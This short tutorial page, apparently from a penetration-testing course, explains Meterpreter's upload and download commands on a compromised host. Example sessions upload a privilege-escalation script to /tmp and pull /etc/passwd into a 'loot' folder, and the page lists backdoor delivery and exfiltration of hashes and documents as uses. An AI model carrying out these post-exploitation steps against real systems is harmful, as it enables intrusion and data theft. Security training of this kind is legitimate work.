File Transfer: Uploading and Downloading with Meterpreter

Securely transfer files to and from the compromised host using Meterpreter's built-in commands.

The `upload` Command

Transfers a file from your local machine to the compromised target. Essential for deploying tools or custom scripts.

meterpreter > upload /home/kali/tools/privesc.sh /tmp/privesc.sh
[+] uploading : /home/kali/tools/privesc.sh -> /tmp/privesc.sh
[+] uploaded : /tmp/privesc.sh

The `download` Command

Retrieves a file from the compromised target to your local machine. Crucial for data exfiltration and evidence collection.

meterpreter > download /etc/passwd /home/kali/loot/passwd.txt
[+] downloading: /etc/passwd -> /home/kali/loot/passwd.txt
[+] downloaded : /home/kali/loot/passwd.txt

Practical Applications

  • •Upload: Deliver privilege escalation scripts, custom backdoors, or persistence mechanisms.
  • •Download: Exfiltrate sensitive data like password hashes, configuration files, or proprietary documents.
Key Takeaway

The upload and download commands are essential for moving data, enabling further exploitation and data exfiltration in a controlled manner.
